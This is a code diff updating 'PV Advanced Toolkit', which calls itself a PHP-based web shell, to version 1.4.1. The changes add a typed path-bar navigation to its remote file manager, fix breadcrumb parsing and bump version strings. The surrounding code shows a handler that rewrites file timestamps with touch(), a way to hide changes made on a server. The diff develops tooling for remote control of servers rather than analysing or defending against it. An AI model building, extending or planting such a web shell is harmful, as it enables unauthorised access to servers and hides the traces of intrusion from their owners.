@@ -596,14 +596,15 @@ function generate_breadcrumbs($path) {
         $path = ltrim($path, '/');
     }
 
-    if (empty($path)) {
+    if ($path === '') {
         return $breadcrumbs;
     }
 
     $parts = explode('/', $path);
 
     foreach ($parts as $part) {
-        if (empty($part)) continue;
+        // --- BUG FIX: Changed 'empty($part)' to '$part === ""' to allow for folder names like "0" ---
+        if ($part === '') continue;
         if (substr($current_path_builder, -1) !== '/') {
             $current_path_builder .= '/';
         }
@@ -1220,7 +1221,7 @@ if ($authenticated && isset($_POST['ajax_action'])) {
                 if (!$path) {
                     $response['message'] = '[Error] Item not found: ' . htmlspecialchars($_POST['path']);
                 } elseif ($timestamp === false) {
-                    $response['message'] = '[Error] Invalid date/time format provided: ' . htmlspecialchars($_POST['datetime_str']) . '. Use<x_bin_342>-MM-DD HH:MM:SS.';
+                    $response['message'] = '[Error] Invalid date/time format provided: ' . htmlspecialchars($_POST['datetime_str']) . '. Use YYYY-MM-DD HH:MM:SS.';
                 } else {
                     if (@touch($path, $timestamp)) {
                         $response = array('status' => 'success', 'message' => 'Timestamp updated for ' . htmlspecialchars(basename($path)) . ' to ' . date("Y-m-d H:i:s", $timestamp));
@@ -1340,7 +1341,7 @@ endif;
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Advanced Toolkit v1.4.0</title>
+    <title>Advanced Toolkit v1.4.1</title>
     <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzBmZiIgZD0iTTEyIDJDNi40NzcgMiAyIDYuNDc3IDIgMTJzNC40NzcgMTAgMTAgMTAgMTAtNC40NzcgMTAtMTBTMTcuNTIzIDIgMTIgMnptMCAxOGMtNC40MTEgMC04LTMuNTg5LTgtOHMzLjU4OS04IDgtOCA4IDMuNTg5IDggOC0zLjU4OSA4LTggOHpNODUuNSAxMC41Yy44MjggMCAxLjUuNjcyIDEuNSAxLjVzLS42NzIgMS41LTEuNSAxLjVNNyAxMi44MjggNyAxMnMuNjcyLTEuNSAxLjUtMS41em03IDBjLjgyOCAwIDEuNS42NzIgMS41IDEuNXMwLS42NzIgMS41LTEuNSAxLjVTMTQgMTIuODI4IDE0IDEyczAuNjcyLTEuNSAxLjUtMS41em0tMy41IDRjLTIuMzMxIDAtNC4zMS0xLjQ2NS01LjExNi0zLjVoMTAuMjMyQzE2LjMxIDE2LjAzNSAxNC4zMzEgMTcuNSAxMiAxNy41eiIvPjwvc3ZnPg==">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
@@ -1430,7 +1431,7 @@ endif;
 <body>
     <div class="container">
         <header>
-            <h1>💀 PV Advanced Toolkit v1.4.0</h1>
+            <h1>💀 PV Advanced Toolkit v1.4.1</h1>
             <form method="post" class="logout-form">
                 <input type="hidden" name="action" value="logout">
                 <button type="submit">Logout</button>
@@ -1455,6 +1456,11 @@ endif;
                 <div id="drive-list"></div>
                 <div id="file-manager-path">
                     <!-- Breadcrumbs will be generated here by JS -->
+                </div>
+                <!-- === NEW: Path Bar Navigation === -->
+                <div id="file-manager-path-bar-container" style="margin-top: 10px; display: flex;">
+                    <input type="text" id="file-manager-path-input" class="inputz" style="flex-grow: 1; margin-right: 5px;" placeholder="Enter path and click GO">
+                    <button id="file-manager-go-btn" class="inputzbut">GO</button>
                 </div>
             </div>
             <div class="button-bar">
@@ -1544,7 +1550,7 @@ endif;
                     <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjZwdGpicmw2bmZwcHpmcDg1ZGZuZ2t5cWh1cGI0Y2lzdDB6aGh0ZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/xxlo1yG0pvhJqNhhtj/giphy.gif" alt="Toolkit GIF" style="width: 200px; height: 200px; margin-right: 20px; border-radius: 5px; flex-shrink: 0;">
                     <div style="flex-grow: 1;">
                         <h2>About PV Advanced Toolkit</h2>
-                        <p><strong>Version:</strong> 1.4.0</p>
+                        <p><strong>Version:</strong> 1.4.1</p>
                         <p>This toolkit is a comprehensive PHP-based web shell and server management interface, designed for server administrators and security professionals for system inspection, management, and basic network operations.</p>
                     </div>
                 </div>
@@ -1564,7 +1570,7 @@ endif;
                     </li>
                     <li><strong>Advanced File Manager:</strong>
                         <ul>
-                            <li><strong>NEW: Breadcrumb Navigation:</strong> Navigate directories easily with clickable breadcrumb links.</li>
+                            <li><strong>NEW: Breadcrumb & Path Bar Navigation:</strong> Navigate directories easily with clickable breadcrumb links or by typing directly into an editable path bar.</li>
                             <li><strong>NEW: Drive Detection:</strong> Automatically detects and displays available system drives (e.g., C:\, D:\) for quick access on Windows servers.</li>
                             <li>Browse server directories and view file/folder details (name, type, human-readable size, permissions, last modified date).</li>
                             <li>Remembers the last visited directory across page refreshes.</li>
@@ -1615,6 +1621,8 @@ document.addEventListener('DOMContentLoaded', function() {
     const fileListingBody = document.getElementById('file-listing');
     const driveListContainer = document.getElementById('drive-list');
     const breadcrumbContainer = document.getElementById('file-manager-path');
+    const pathInput = document.getElementById('file-manager-path-input');
+    const goBtn = document.getElementById('file-manager-go-btn');
     const phpInfoIframe = document.getElementById('phpinfo-iframe');
     const fileViewModal = document.getElementById('file-view-modal');
     const fileModalTitle = document.getElementById('file-modal-title');
@@ -1907,6 +1915,10 @@ document.addEventListener('DOMContentLoaded', function() {
         driveListContainer.innerHTML = '';
         breadcrumbContainer.innerHTML = '';
 
+        if (result.path) {
+            pathInput.value = result.path;
+        }
+
         // Render drives if available (for Windows)
         if (result.drives && result.drives.length > 0) {
             result.drives.forEach(drive => {
@@ -1935,7 +1947,7 @@ document.addEventListener('DOMContentLoaded', function() {
                     sepSpan.className = 'separator';
                     // On linux, don't add separator right after the root '/'
                     if (!(separator === '/' && index === 0)) {
-                        sepSpan.textContent = separator;
+                         sepSpan.textContent = " " + separator + " ";
                         breadcrumbContainer.appendChild(sepSpan);
                     }
                 }
@@ -2023,6 +2035,20 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
+    // === NEW: Event listeners for Path Bar Navigation ===
+    function navigateToInputPath() {
+        const newPath = pathInput.value.trim();
+        if (newPath) {
+            fetchFiles(newPath);
+        }
+    }
+    goBtn.addEventListener('click', navigateToInputPath);
+    pathInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            navigateToInputPath();
+        }
+    });
 
     document.getElementById('file-manager-home-btn').addEventListener('click', () => fetchFiles(scriptHomeDirectory));
 
